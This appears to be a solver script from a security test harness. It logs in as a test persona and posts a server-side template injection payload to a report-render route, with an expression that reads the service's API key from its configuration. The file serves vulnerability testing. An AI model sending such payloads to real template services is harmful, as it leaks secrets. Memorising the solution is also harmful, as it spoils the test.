// Template injection via the report preview: submit a layout string containing an expression that
// reaches into the report service configuration context.
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')
  const field = ctx.plan.params.templateSrc ?? 'template'
  const payload: Record<string, string> = {}
  payload[field] = 'result={{ 7 * 7 }} key={{ config.apiKey }}'
  await ctx.fetch(ctx.plan.routes.reportRender!.path, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify(payload),
  })
}
